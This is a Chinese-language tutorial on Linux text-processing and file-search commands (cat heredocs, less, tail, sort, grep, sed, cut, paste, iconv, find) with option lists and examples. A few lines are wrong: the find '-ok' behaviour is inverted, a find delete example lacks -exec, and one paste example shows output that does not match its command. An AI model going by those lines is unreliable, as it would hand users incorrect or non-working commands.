EOF是END Of File的缩写,表示自定义终止符,既然自定义,那么EOF就不是固定的,可以随意设置别名,在linux按ctrl-d就代表EOF
EOF一般会配合cat能够多行文本输出,用法:
<< EOF        //开始
....
EOF           //结束

还可以自定义,比如自定义:
<< BBB        //开始
....
BBB           //结束

1)向文件test.sh里输入内容。
$ cat << EOF >test.sh
> 123123123
> asdfasdfs
> EOF

2)追加内容
# cat << EOF >>test.sh
> 7777
> 8888
> EOF

3)自定义EOF,比如自定义为wang
# cat << wang > haha.txt
> ggggggg
> 6666666
> wang

【 tac命令 】
从最后一行开始显示,可以看出tac是cat的倒著写

【 nl命令 】
显示的时候顺道输出行号
-b :指定行号指定的方式,主要有两种:
-b a :表示不论是否为空行,也同样列出行号(类似 cat -n);
-b t :如果有空行,空的那一行不要列出行号(默认值);
-n :列出行号表示的方法,主要有三种:
-n ln :行号在荧幕的最左方显示;
-n rn :行号在自己栏位的最右方显示,且不加 0 ;
-n rz :行号在自己栏位的最右方显示,且加 0 ;
-w :行号栏位的占用的位数。

【 more命令 】
分页显示文件内容,在more这个程序的运行过程中有几个按键可以按的:
空白键(space):代表向下翻一页;
Enter         :代表向下翻『一行』;
/字串         :代表在这个显示的内容当中,向下搜寻『字串』这个关键字;
:f            :立刻显示出文件名以及目前显示的行数;
q             :代表立刻离开more,不再显示该文件内容。
b 或 [ctrl]-b :代表往回翻页,不过这动作只对文件有用,对管线无用。

【 less命令 】
与more类似,但比more更好的是可以往前翻页,less运行时可以输入的命令有:
gg        :翻到文件头
G         :翻到文件尾
空白键    :向下翻动一页;
[pagedown]:向下翻动一页;
[pageup]  :向上翻动一页;
/字串     :向下搜寻『字串』的功能;
?字串     :向上搜寻『字串』的功能;
n         :重复前一个搜寻(与/或?有关)
N         :反向的重复前一个搜寻(与/或?有关)
q         :离开less程序

man命令的分页使用less,所以快捷键相同
less的快捷键在vi中基本可用

【 head命令 】
只看头几行
-n :后面接数字,代表显示几行的意思

【 tail命令 】
只看尾巴几行
-f 循环读取
-q 不显示处理信息
-v 显示详细的处理信息
-c<数目> 显示的字节数
-n<行数> 显示行数,默认10行
--pid=PID 与-f合用,表示在进程ID,PID死掉之后结束.
-q, --quiet, --silent 从不输出给出文件名的首部
-s, --sleep-interval=S 与-f合用,表示在每次反复的间隔休眠S秒

$ tail -n 20 /var/log/message    # 显示最新的20行日志
$ tail +20 notes.log             # 显示文件notes.log的内容,从第20行至文件末尾
$ tail -c 10 notes.log           # 显示文件notes.log的最后10个字符
$ tail -3 notes.log              # 取文件的最后3行

-f 常用于查阅正在改变的日志文件。
tail -f filename
会把filename文件里的最尾部的内容显示在屏幕上并不断刷新,只要filename更新就可以看到最新的文件内容。

【 wc命令 】
查看一个文件中有多少行,多少单词和多少字符
wc filename
例:wc demo.txt
7459   15915  398400 demo.txt
7459是行数,15915是单词数,398400是字符数

【 uniq命令 】
用于检查及删除文本文件中重复出现的行列
uniq [-cdu][-f<栏位>][-s<字符位置>][-w<字符位置>][--help][--version][输入文件][输出文件]

参数:
-c或--count 在每列旁边显示该行重复出现的次数。
-d或--repeated 仅显示重复出现的行列。
-f<栏位>或--skip-fields=<栏位> 忽略比较指定的栏位。
-s<字符位置>或--skip-chars=<字符位置> 忽略比较指定的字符。
-u或--unique 仅显示出一次的行列。
-w<字符位置>或--check-chars=<字符位置> 指定要比较的字符。
--help 显示帮助。
--version 显示版本信息。
[输入文件] 指定已排序好的文本文件。
[输出文件] 指定输出的文件。

$ cat testfile
test 30
test 30
Hello 95
Hello 95
Hello 95
Linux 85
Linux 85
$ uniq testfile
test 30
Hello 95
Linux 85
$ cat testfile
test 30
test 30
Hello 95
Hello 95
Hello 95
Linux 85
Linux 85
$ uniq -c testfile   # 检查文件并删除文件中重复出现的行,并在行首显示该行重复出现的次数
2 test 30
3 Hello 95
2 Linux 85

$ cat testfile|uniq

【 sort命令 】
排序文本文件的行,默认比较原则是从首字符向后,依次按ASCII码值进行比较,最后将他们按升序输出

sort example.txt              # 使用sort命令以默认方式(ASCII码)对文件的行进行排序
sort example.txt | sort -R    # 随机化一个排序的example.txt
sort example.txt | uniq       # 只显示example.txt的唯一行(首先需要排序,否则看不到重叠)
sort example.txt | uniq -c    # 显示每行的唯一项,并显示找到了多少个实例
sort -u example.txt           # u选项排除,减少uniq使用管道

sort [-bcdfimMnr][-o<输出文件>][-t<分隔字符>][+<起始栏位>-<结束栏位>][--help][--verison][文件]

-b 忽略每行前面开始出的空格字符。
-c 检查文件是否已经按照顺序排序。
-d 排序时,处理英文字母、数字及空格字符外,忽略其他的字符。
-f 排序时,将小写字母视为大写字母。
-i 排序时,除了040至176之间的ASCII字符外,忽略其他的字符。
-m 将几个排序好的文件进行合并。
-M 将前面3个字母依照月份的缩写进行排序。
-n 依照数值的大小排序,10比2小是由于排序程序将这些数字按字符来排序
-o<输出文件> 将排序后的结果存入指定的文件。
-r 以相反的顺序来排序。
-t<分隔字符> 指定排序时所用的栏位分隔字符。
-u 在输出行中去除重复行
+<起始栏位>-<结束栏位> 以指定的栏位来排序,范围由起始栏位到结束栏位的前一栏位。
--help 显示帮助。
--version 显示版本信息。

</pre><textarea># cat date
2017-12-02
2017-01-09
2017-10-23
2017-04-24

# sort -n -k 2 -t'-' date      // -t<分隔字符> 指定排序时所用的栏位分隔字符。 -k选择以哪个区间进行排序
2017-01-09
2017-04-24
2017-10-23
2017-12-02

</textarea><pre>
【 grep命令 】
grep pattern filename/dirname
在文本中执行关键词搜索,返回匹配的结果,可以使用grep搜索与一个或多个正则表达式匹配的文本行,并仅输出匹配的行
grep指令用于查找内容包含指定的范本样式的文件,如果发现某文件的内容符合所指定的范本样式,预设grep指令会显示含有范本样式的那一列
若不指定任何文件名称,或是所给予的文件名为"-",则grep指令会从标准输入设备读取数据。

grep [-abcEFGhHilLnqrsvVwxy][-A<显示列数>][-B<显示列数>][-C<显示列数>][-d<进行动作>][-e<范本样式>][-f<范本文件>][--help][范本样式][文件或目录...]
参数:
-a 或 --text :                                    不要忽略二进制的数据。
-A<显示行数>或--after-context=<显示行数> :         除了显示符合范本样式的那一列之外,并显示该行之后的内容。
-b 或 --byte-offset :                             在显示符合样式的那一行之前,标示出该行第一个字符的编号。
-B<显示行数> 或 --before-context=<显示行数> :      除了显示符合样式的那一行之外,并显示该行之前的内容。
-c 或 --count :                                   计算符合样式的列数。
-C<显示行数> 或 --context=<显示行数>或-<显示行数> : 除了显示符合样式的那一行之外,并显示该行之前后的内容。
-d <动作>或--directories=<动作> :   当指定要查找的是目录而非文件时必须使用这项参数,否则grep指令将回报信息并停止动作
-e<范本样式>或--regexp=<范本样式> :  指定字符串做为查找文件内容的样式。
-E 或 --extended-regexp :          将样式为延伸的普通表示法来使用。
-f<文件>或--file=<文件>   指定规则文件,其内容含有一或多个规则样式,让grep查找符合条件的文件内容,格式为每行一个规则样式
-F 或 --fixed-regexp :        将样式视为固定字符串的列表。
-G 或 --basic-regexp :        将样式视为普通的表示法来使用。
-h 或 --no-filename :         在显示符合样式的那一行之前,不标示该行所属的文件名称。
-H 或 --with-filename :       在显示符合样式的那一行之前,表示该行所属的文件名称。
-i 或 --ignore-case :         忽略字符大小写的差别。
-l 或 --file-with-matches :   列出文件内容符合指定的样式的文件名称。
-L 或 --files-without-match : 列出文件内容不符合指定的样式的文件名称。
-n 或 --line-number :         在显示符合样式的那一行之前,标示出该行的列数编号。
-q 或 --quiet或--silent :     不显示任何信息。
-r 或 --recursive :           此参数的效果和指定"-d recurse"参数相同,用于搜索指定目录下的所有文件
-s 或 --no-messages :         不显示错误信息。
-v 或 --revert-match :        显示不包含匹配文本的所有行。
-V 或 --version :             显示版本信息。
-w 或 --word-regexp :         只显示全字符合的列,只搜索单词
-x --line-regexp :            只显示全列符合的列。
-y :                          此参数的效果和指定"-i"参数相同。
-o, --only-matching           show only the part of a line matching PATTERN

</pre><textarea>grep admin /etc/passwd
grep -r admin /etc/

在当前目录中查找后缀有file字样的文件中包含test字符串的文件,并打印出该字符串的行
grep test *file

以递归的方式查找符合条件的文件。
查找指定目录/etc/acpi及其子目录下所有文件中包含字符串"update"的文件,并打印出该字符串所在行的内容
grep -r update /etc/acpi

反向查找,通过"-v"参数可以打印出不符合条件行的内容。
查找文件名中包含test的文件中不包含test的行
grep -v test *test*

在文件里查找
grep -rlI 'main' .
find -type f -name *.java -exec grep -l 'main' {} \;

</textarea><pre>
【 egrep命令 】
打印匹配模式的行 - 扩展表达式(别名为:'grep -E')
检索扩展的正则表达式(包括表达 式组和可选项)
egrep是用extended regular expression语法来解读的,而grep则用basic regular expression 语法解读,extended regular expression比basic regular expression的表达更规范

egrep '(Lorem|dolor)' example.txt    # 在其中显示"Lorem"或"dolor"的行
grep -E '(Lorem|dolor)' example.txt

$ egrep Linux *   # 查找当前目录下所有文件中包含字符串"Linux"的文件

【 fgrep命令 】
打印匹配到模式的行 - FIXED模式匹配(别名为:'grep -F')
检索固定字符串,不识别正则表达式,是快速搜索命令

fgrep '(Lorem|dolor)' example.txt    # 在example.txt中找到具体的字符串'(Lorem | doloar)'
grep -F '(Lorem|dolor)' example.txt

fgrep -r "Hello World" ./* :查询当前目标下内容包含hello world的文件,-r表示查询包括子目录。

【 正则表达式 】
正则表达式是Linux/Unix系统中非常重要的概念。正则表达式(也称为"regex"或"regexp")是一个可以描述一类字符串 的模式(Pattern)。如果一个字符串可以用某个正则表达式来描述,我们就说这个字符和该正则表达式匹配(Match)。这和DOS中用户可以使用通 配符 "*"代表任意字符类似。在Linux系统上,正则表达式通常被用来查找文本的模式,以及对文本执行"搜索－替换"操作和其它功能。

【 awk命令 】
处理文本文件最有用的命令,一行一行地在整个文件上运行,默认情况下使用空格分隔字段
awk命令最常用的语法是
awk '/search_pattern/ { action_to_take_if_pattern_matches; }' file_to_parse
例:awk -F':' '{ print $1 }' /etc/passwd
从passwd文件获取用户名,-F指定在我们要基于冒号分隔字段,{ print $1 } 意味着打印出第一个匹配字段

【 tr命令 】
替换文本文件中的字符,格式为"tr [原始字符] [目标字符]"
cat example.txt | tr 'a-z' 'A-Z'  # 把所有小写字母变成为大写
cat example.txt | tr ' ' '\n'     # 把所有的空格变成换行符

将文本文件中DOS换行符号转化为UNIX的换行符号,当然使用vim编辑文件时,vim也提供文件转换功能
tr -s "\r" "\n" < inputfile
tr -s "\r" "\n" < inputfile >outputfile

整个文件大小写转换
tr a-z A-Z < **.txt
tr A-Z a-z < **.txt

【 sed命令 】
用于过滤和转换文本的流编辑器
sed是一种流编辑器,它是文本处理中非常中的工具,能够完美的配合正则表达式使用,功能不同凡响。处理时,把当前处理的行存储在临时缓冲区中,称为"模式空间"(pattern space),接着用sed命令处理缓冲区中的内容,处理完成后,把缓冲区的内容送往屏幕。接着处理下一行,这样不断重复,直到文件末尾。文件内容并没有 改变,除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。

sed命令是一个面向字符流的非交互式编辑器,也就是说sed不允许用户与它进行交互操作。sed是按行来处理文本内容的。在shell中,使用sed来批量修改文本内容是非常方便的

命令格式
sed [选项] [动作]
sed [options] 'command' file(s)
sed [options] -f scriptfile file(s)

选项与参数:
-n :使用安静(silent)模式
一般sed所有来自STDIN的数据都会被列出到终端上。加上-n参数后则只有经过sed特殊处理的那一行(或动作)才会被列出来
-e :直接在命令列模式上进行sed的动作编辑, -e script或--expression=script
-f :直接将sed的动作写在一个文件内, -f filename或--file=filename则可以运行filename内的sed动作;
-r :sed的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)
-i :直接修改读取的文件内容,而不是输出到终端。
-V或--version:显示版本信息
-h或--help:显示帮助

function:
a :新增行,a的后面可以接字串,而这些字串会在新的一行出现(目前的下一行)
i :插入行,i的后面可以接字串,而这些字串会在新的一行出现(目前的上一行)
c :取代行,c的后面可以接字串,这些字串可以取代 n1,n2 之间的行,整行替换
d :删除行,d后面通常不接任何参数,直接删除地址表示的行
p :将某个选择的数据印出。通常p会与参数sed -n一起运行
s :行内部分替换,通常这个s的动作可以搭配正规表示法,例如 1,20s/old/new/g 一般是替换符合条件的字符串而不是整行
一般function的前面会有一个地址的限制,例如[地址]function,表示动作要操作的行

所有的新增,删除,替换行命令前面的地址修饰都可以指定地址空间,也都可以使用正则表达式,命令会应用在选出的符合地址条件的所有行上面

a\ 在当前行下面插入文本。
i\ 在当前行上面插入文本。
c\ 把选定的行改为新的文本。
d 删除,删除选择的行。
D 删除模板块的第一行。
s 替换指定字符
h 拷贝模板块的内容到内存中的缓冲区。
H 追加模板块的内容到内存中的缓冲区。
g 获得内存缓冲区的内容,并替代当前模板块中的文本。
G 获得内存缓冲区的内容,并追加到当前模板块文本的后面。
l 列表不能打印字符的清单。
n 读取下一个输入行,用下一个命令处理新的行而不是用第一个命令。
N 追加下一个输入行到模板块后面并在二者间嵌入一个新行,改变当前行号码。
p 打印模板块的行。
P(大写) 打印模板块的第一行。
q 退出Sed。
b lable 分支到脚本中带有标记的地方,如果分支不存在则分支到脚本的末尾。
r file 从file中读行。
t label if分支,从最后一行开始,条件一旦满足或者T,t命令,将导致分支到带有标号的命令处,或者到脚本的末尾。
T label 错误分支,从最后一行开始,一旦发生错误或者T,t命令,将导致分支到带有标号的命令处,或者到脚本的末尾。
w file 写并追加模板块到file末尾。
W file 写并追加模板块的第一行到file末尾。
! 表示后面的命令对所有没有被选定的行发生作用。
= 打印当前行号码。
# 把注释扩展到下一个换行符以前。

sed替换标记
g 表示行内全面替换。
p 表示打印行。
w 表示把行写入一个文件。
x 表示互换模板块中的文本和缓冲区中的文本。
y 表示把一个字符翻译为另外的字符(但是不用于正则表达式)
\1 子串匹配标记
& 已匹配字符串标记

sed正则中的元字符集
^ 匹配行开始,如:/^sed/匹配所有以sed开头的行。
$ 匹配行结束,如:/sed$/匹配所有以sed结尾的行。
. 匹配一个非换行符的任意字符,如:/s.d/匹配s后接一个任意字符,最后是d。
* 匹配0个或多个字符,如:/*sed/匹配所有模板是一个或多个字符后紧跟sed的行。
[] 匹配一个指定范围内的字符,如/[sS]ed/匹配sed和Sed。
[^] 匹配一个不在指定范围内的字符,如:/[^A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头,紧跟ed的行。
\(..\) 匹配子串,保存匹配的字符,如s/\(love\)able/\1rs,loveable被替换成lovers。
& 保存搜索字符用来替换其他字符,如s/love/**&**/,love这成**love**。
\< 匹配单词的开始,如:/\< love/匹配包含以love开头的单词的行。
\> 匹配单词的结束,如/love\>/匹配包含以love结尾的单词的行。
x\{m\} 重复字符x,m次,如:/0\{5\}/匹配包含5个0的行。
x\{m,\} 重复字符x,至少m次,如:/0\{5,\}/匹配至少有5个0的行。
x\{m,n\} 重复字符x,至少m次,不多于n次,如:/0\{5,10\}/匹配5~10个0的行。
\+ 一次或多次　　
\? 零次或一次
\| 表示或语法

sed 's/ /-/g' example.txt       # 用连字符替换所有空格
sed 's/[0-9]/d/g' example.txt  # 用d替换所有的数字

如果使用sed对文件进行过滤,最好将问题分成几步,分步执行,且边执行边测试结果

</pre><textarea>1、p:搜索打印匹配行
sed '2p' /etc/passwd       #打印出所有行且第2行会打印两次
sed -n '2p' /etc/passwd       #打印出第2行
sed -n '1,3p' /etc/passwd     #打印出第1到第3行
sed -n '$p' /etc/passwd       #打印出最后一行
sed -n '/user/'p /etc/passwd  #打印出含有user的行
sed -n '/\$/'p /etc/passwd    #打印出含有$元字符的行,$意为最后一行
sed -n '/FTP/p' /etc/passwd   #打印出有FTP的行

2、插入文本和附加文本(插入新行),添加-i参数才会修改源文件
sed '1a hello world' test.txt     #第一行的后面添加一行hello world
sed 'a hello world' test.txt      #a的前面没有地址限定则在所有行的后面都会添加指定的字符串
sed '1i hello world' test.txt     #第一行的前面添加一行hello world

sed '/FTP/ a\ 456' /etc/passwd    #在含有FTP的行后面新插入一行,内容为456
sed '/FTP/ i\ 123' /etc/passwd    #在含有FTP的行前面新插入一行,内容为123
sed '/FTP/ i\ "123"' /etc/passwd  #在含有FTP的行前面新插入一行,内容为"123"
sed '5 a\ 123' /etc/passwd        #在第5行后插入一新行,内容为123
sed '5 i\ "12345"' /etc/passwd    #在第5行前插入一新行,内容为"12345"

3、删除文本,不修改源文件
sed '1d' /etc/passwd         #删除第1行
sed '11,$d' /etc/passwd      #删除第11行及后面所有的行,$表示最后一行
sed '11,30d' /etc/passwd     #删除第11至30行,不足30行的从11行开始删除所有的行
sed '/user/d' /etc/passwd    #删除带有user的行
sed -i '/^$/d' ver_info.txt  #删除原文的空行

4、c:整行替换
sed '1c hello world' test.txt     #替换第一行的所有内容为hello world
sed '/^2/c hello world' test.txt  #替换以2开头的行的所有内容为hello world

s:替换文本,替换命令用替换模式替换指定模式,g:全局
sed 's/user/USER/' /etc/passwd     #将第1个user替换成USER,只替换每一行中的第一个user
sed 's/user/USER/g' /etc/passwd    #将所有user替换成USER,g表明全局替换
sed 's/user/#user/' /etc/passwd    #将第1个user替换成#user,如用于屏蔽作用
sed 's/user//' /etc/passwd         #将第1个user替换成空
sed 's/remote_gateway_hostname.*/remote_gateway_hostname=/' config.ini #很有用
sed 's/user/&11111111111111/' /etc/passwd  #附加或修改一个很长的字符串可以使用&命令保存发现模式以便重新调用它,然后把它放在替换字符串里面
sed 's/user/11111111111111&/' /etc/passwd  #这里是将&放后面

与其他针对行的操作一样,s命令也可以进行地址选择,其地址使用方法与我们之前的一样,也就是在s的前面加上地址空间限定
sed '1s/aa/AA/g' test.txt          #仅仅对第一行进行了替换操作
sed '5,$s/aa/AA/g' test.txt        #对第5行直到文件末尾的所有行进行搜索替换操作
sed '/^[0-9]/s/aa/AA/g' test.txt   #对所有以数字开头的行执行s操作

y:替换字符
sed 'y/abc/ABC/g' fileName         #把fileName中所有的a替换成Ａ,b替换成Ｂ,

5、-i:修改源文件
sed -i 's/cpu/lgj/' sys_info.txt   #将修改生效到原文件

6、参数-e:执行一条命令,可以用-e参数给一行一次执行多条命令以提高效率
sed 's/^str1/str2/' fileName                        #把fileName中每行开头的str1替换成str2
sed –e 's/^str1/str2/' –e 's/str1$/str2/' fileName

Sed里使用变量的问题
1、eval sed 's/$a/$b/' filename
2、sed "s/$a/$b/" filename
3、sed 's/'$a'/'$b'/' filename
4、sed s/$a/$b/ filename

我比较喜欢第二种,也就是:Sed后面的表达式一般用单引号引起来('),当需要使用变量时就换用双引号(")

</textarea><pre>
sed执行模式及效率优化
sed是一个POSIX.2标准支持的流编辑程序。sed在执行过程中利用了二个可以操作的空间:模式空间和缓冲空间,和一个可控制的操作循环(cycle)。 sed的执行模式的便是基于这样一个循环操作:读入一行文本进入模式空间并执行操作,直到输入结束或主动退出。

sed的魅力便在于利用这二个空间和操作循环所进行的运算及由此产生的强大功能,这种强大充分体现在sed运算的图灵完备性:单个sed命令可以模拟所有图灵运算。简单的说,单个sed命令可以实现任何的运算任务。尽管如此,限于sed的执行模式和效率考虑,一般情况下却不将sed 用于文本操作外的计算比如数学运算等,sed通常应用于文本的查询,替换,过滤等操作。

了解了sed的执行模式,我们就可以通过控制sed的循环,采用合理的程序逻辑以提高命令执行效率。

实例:sed应用,读取指定行
方法1:sed -n '45,50p' filename
方法2:sed -n '51q;45,50p' filename
实例结果分析:方法2在方法1基础上增加了一个判断,当文件读取到第51行时即时退出。避免文件后续部分的遍历,在大数据量处理上能够很大的提高执行效率。

实例:sed应用,文本替换
方法1:sed 's/foo/bar/g' filename
方法2:sed '/foo/ s/foo/bar/g' filename
实例结果分析:sed支持采用正则进行匹配和替换,考虑字符串替换的需求中,不防加上地址以提高速度。实例中通过增加一个判断逻辑,采用"事先匹配"代替"直接替换",由于sed会保留前一次的正则匹配环境,不会产生冗余的正则匹配,因此方法2具有比方法1更 高的效率

【 cut命令 】
cut OPTION... [FILE]...
cut [-bn] [file] 或 cut [-c] [file] 或 cut [-df] [file]
Print selected parts of lines from each FILE to standard output
cut命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。
如果不指定File参数,cut命令将读取标准输入,必须指定-b、-c或-f标志之一。

主要参数
-b :以字节为单位进行分割,这些字节位置将忽略多字节字符边界,除非也指定了-n标志
-c :以字符为单位进行分割
-d :自定义分隔符,默认为制表符TAB
-f :指定显示的字段
-n :与-b选项连用,不分割多字节字符。如果字符的最后一个字节落在由-b标志的List参数指示的范围之内,该字符将被写出;否则该字符将被排除
--complement:反向选择,显示除了-f指定的字段
--out-delimiter=<字段分隔符>:指定输出内容是的字段分割符;
--help:显示指令的帮助信息;
--version:显示指令的版本信息。

$ cat /etc/passwd | tail -n 5 | cut -d : -f 1
$ cut -d " " -f2,7,9 example.txt   # 显示第2,7和9栏的空格作为分隔符

</pre><textarea>$ cat cutfile
ID897 P.Jones 25 85 96
ID666 S.Round 22 78 89
ID982 L.Clip 24 97 86

$ cut -d " " -f 1 cutfile
ID897
ID666
ID982

$ cut -d " " -f 1,3 cutfile
ID897 25
ID666 22
ID982 24

$ cut -d " " -f 1,3 --complement cutfile   # 反向选择
P.Jones 85 96
S.Round 78 89
L.Clip 97 86

$ cut -c1-3 cutfile
ID8
ID6
ID9

$ cut -c-3 cutfile
ID8
ID6
ID9

$ cut -c3- cutfile
897 P.Jones 25 85 96
666 S.Round 22 78 89
982 L.Clip 24 97 86

</textarea><pre>
【 paste命令 】
paste命令用于合并文件的列,与cut命令完成的功能刚好相反
paste指令会把每个文件以列对列的方式,一列列地加以合并

paste [-s][-d <间隔字符>][--help][--version][文件...]

参数:
-d<间隔字符>或--delimiters=<间隔字符> 　用指定的间隔字符取代跳格字符,默认空格或tab键的域分隔符
-s或--serial 　串列进行而非平行处理。
--help 　      在线帮助。
--version 　   显示帮助信息。
[文件…]        指定操作的文件路径

</pre><textarea>$ cat > pas1
ID897
ID666
ID982

$ cat > pas2
P.Jones
S.Round
L.Clip

$ paste pas1 pas2       # paste命令将pas1和pas2两文件粘贴成两列
ID897  P.Jones
ID666  S.Round
ID982  L.Clip

$ paste pas1 pas2       # 通过交换文件名即可指定哪一列先粘
P.Jones  ID897
S.Round  ID666
L.Clip   ID982

$ paste -d: pas1 pas2   # 用冒号做域分隔符
P.Jones:ID897
S.Round:ID666
L.Clip:ID982

$ paste -s pas1 pas2    # 多个文件合并两行,而不是按行粘贴,可以使用-s选项
ID897   ID666   ID982
P.Jones S.Round L.Clip

$ paste -s pas1         # -s将一个文件中的多行数据合并为一行进行显示
ID897   ID666   ID982

$ ls /etc | paste -d" " - - - - - -  # 选项-,对每一个-从标准输入中读一个数据,以一个6列格式显示目录列表
acpi adduser.conf alternatives apache2 apm apparmor
apparmor.d apport apt at.deny at-spi2 bash.bashrc
cron.daily cron.hourly cron.monthly crontab cron.weekly crypttab
………………

$ ls /etc | paste -d":" -           # 以一列格式显示输出
acpi
adduser.conf
alternatives
apache2
apm
………………

</textarea><pre>
【 fmt命令 】
简单的最佳文本格式化程序
cat example.txt | fmt -w 20      # 将example.txt的行输出为20个字符的宽度

【 iconv命令 】
iconv命令实现linux编码转换,这是针对文件的,即将指定文件从一种编码转换为另一种编码。
iconv [选项...] [文件...]

1.输入/输出格式规范:
-f, --from-code=名称 原始文本编码
-t, --to-code=名称 输出编码

2.列举所有已知的字符集　　
-l, --list

3.输出控制:
-c 　　               从输出中忽略无效的字符
-o, --output=FILE　　 输出文件
-s, --silent　　      关闭警告
--verbose　　         打印进度信息

iconv -f gb2312 -t utf-8 -c file1 -o  file2
iconv -f utf-8 -t gb2312 /server_test/reports/software_.txt > /server_test/reports/software_asserts.txt

在做编码转换的时候,如果源格式设定为GB2312,而且在转换成UTF-8的时候,发现程序会报"illegal input sequence at position xxxx"的错误。这是由于之前的做的假定有问题。GB2312是国标里面一个最小也是最早的中文编码标准,其中只涵盖了6763个汉字,所以需要转换的文件的原始的格式可能并不是GB2312编码。这个时候可以用GB18030做为源格式来进行转换。GB18030是最新的国家标准,包含了27564个汉字,而且向下兼容GB2312和GBK。

使用iconv自动判断文件编码
iconv -f utf8 file.name 1>/dev/null 2>/dev/null && echo 1
iconv -f gbk file.name 1>/dev/null 2>/dev/null && echo 2

把是否该编码包装成一个函数:
isEnc() {
  local temp=`iconv -f $2 $1 1>/dev/null 2>/dev/null && echo 'true'`;
  if [ "$temp" = 'true' ]; then
    return 0;
  fi;
  return -1;
}

使用:
isEnc file.name utf8 && echo 'file is utf8'
isEnc file.name gbk && echo 'file is gbk'

</pre>

<h4>find命令</h4><pre>
用来在指定目录下查找文件
任何位于参数之前的字符串都将被视为欲查找的目录名
如果使用该命令时不设置任何参数,则find命令将在当前目录下查找子目录与文件,且将查找到的子目录和文件全部进行显示

find <指定目录> <指定条件> <指定动作>
<指定目录>： 所要搜索的目录及其所有子目录,默认为当前目录。
<指定条件>： 所要搜索的文件的特征。
<指定动作>： 对搜索结果进行特定的处理。

如果什么参数也不加,find默认搜索当前目录及其子目录,并且不过滤任何结果,也就是返回所有文件,将它们全都显示在屏幕上

find path -option [ -print ] [ -exec -ok command ] {} \ ;

参数说明 :
-atime< 24小时数>:      查找在指定时间曾被存取过的文件或目录,单位以24小时计算;
-amin<分钟>:            查找在指定时间曾被存取过的文件或目录,单位以分钟计算;
-anewer<参考文件或目录>:查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录;
-ctime< 24小时数>:      查找在指定时间之时被更改的文件或目录,单位以24小时计算;
-cmin<分钟>:            查找在指定时间之时被更改过的文件或目录;
-cnewer<参考文件或目录>  查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录;
-mtime< 24小时数>:      查找在指定时间曾被更改过的文件或目录,单位以24小时计算;
-mmin<分钟>:            查找在指定时间曾被更改过的文件或目录,单位以分钟计算;
-used<日数>:            查找文件或目录被更改之后在指定时间曾被存取过的文件或目录,单位以日计算;
-newer<参考文件或目录>: 查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录;
-daystart:              从本日开始计算时间

-depth:                 从指定目录下最深层的子目录开始查找;
-maxdepth<目录层级>:    设置最大目录层级;
-mindepth<目录层级>:    设置最小目录层级;
-exec<执行指令>:        假设find指令的回传值为True就执行该指令;
-ok<执行指令>:          与"-exec"类似,但执行之前会先询问用户,若回答"y"或"Y"则放弃执行命令;
-follow:                排除符号连接;
-gid<群组识别码>:       查找符合指定之群组识别码的文件或目录;
-group<群组名称>:       查找符合指定之群组名称的文件或目录;
-name<范本样式>:        指定字符串作为寻找文件或目录的范本样式;
-iname<范本样式>:       与"-name"参数类似,但忽略字符大小写的差别;
-iname<范本样式>:       指定字符串作为寻找符号连接的范本样式;
-ilname<范本样式>:      与"-lname"参数类似,但忽略字符大小写的差别;
-inum< inode编号>:      查找符合指定的inode编号的文件或目录;
-iregex<范本样式>:      与"-regexe"参数类似,但忽略字符大小写的差别;
-links<连接数目>:       查找符合指定的硬连接数目的文件或目录;
-ls:                    假设find指令的回传值为Ture就将文件或目录名称列出到标准输出,输出信息类似ls -al
-fls<列表文件>:         与"-ls"参数类似,但会把结果保存为指定的列表文件;
-nogroup:               找出不属于本地主机群组识别码的文件或目录;
-noleaf:                不去考虑目录至少需拥有两个硬连接存在;
-nouser:                找出不属于本地主机用户识别码的文件或目录;
-prune:                 不寻找字符串作为寻找文件或目录的范本样式;
-regex<范本样式>:       指定字符串作为寻找文件或目录的范本样式;
-path<范本样式>:        指定字符串作为寻找目录的范本样式;
-ipath<范本样式>:       与"-path"参数类似,但忽略字符大小写的差别;
-perm<权限数值>:        查找符合指定的权限数值的文件或目录,例:find /sbin -perm +700
-print:                 find指令的回传值为Ture时将文件或目录名称列出到stdout,每列一个名称,默认
-print0:                find指令的回传值为Ture时将文件或目录名称列出到stdout,全部名称在同一行
-printf<输出格式>:      find指令的回传值为Ture时将文件或目录名称列出到stdout,格式可以自行指定
-fprint<列表文件>:      与"-print"参数类似,但会把结果保存成指定的列表文件;
-fprint0<列表文件>:     与"-print0"参数类似,但会把结果保存成指定的列表文件;
-fprintf<列表文件><输出格式>:与"-printf"参数类似,但会把结果保存成指定的列表文件;
-size<文件大小>:        查找符合指定的文件大小的文件;
-empty:                 寻找文件大小为0Byte的文件或目录下没有任何子目录或文件的空目录;
-true:                  将find指令的回传值皆设为True;
-false:                 将find指令的回传值皆设为False;
-fstype<文件系统类型>:  只寻找该文件系统类型下的文件或目录;
-typ<文件类型>:         只寻找符合指定的文件类型的文件;
-xtype<文件类型>:       与"-type"参数类似,差别在于它针对符号连接检查。
-uid<用户识别码>:       查找符合指定的用户识别码的文件或目录;
-user<拥有者名称>:      查找符和指定的拥有者名称的文件或目录;
-xdev:                  将范围局限在先行的文件系统中;
-mount:                 此参数的效果和指定"-xdev"相同;
-help或——help:          在线帮助;
-version或——version:    显示版本信息;

find . -name "*.log" 2>/dev/null  # 将错误信息写入/dev/null黑洞文件
alias findfile='find . -depth -type f -iname "*" 2>/dev/null | xargs md5sum 2>/dev/null | grep --color -nE -ir'

操作用户没有权限的目录
find / -perm -4000 -user 0 -ls 2>/dev/null
find / -perm -4000 -user 0 -ls 2>&1 | grep -v "cannot"

find . -type 类型参数
f 普通文件
l 符号连接
d 目录
c 字符设备
b 块设备
s 套接字
p Fifo

批量删除当前文件夹下所有txt文件
find . -name "*.txt" -type f -print -exec rm {} \;  # 不必要带-rf
find . -name "*.txt" -type f | xargs rm             # 不必要带-rf
find -type f -size 0 -exec rm {} ;                  # 删除空文件
find -type f -mtime +30 rm {} ;                     # 删除30天以前的文件

find                                         # 列出当前目录及子目录下所有文件和文件夹
find .                                       # 列出当前目录及子目录下所有文件和文件夹
find /home -name "*.txt"                     # 在/home目录下查找以.txt结尾的文件名
find /home -name "*.txt" -ls                 # 搜索/home目录中,所有文件名以.txt结尾的文件,并显示它们的详细信息
find /home | grep .txt
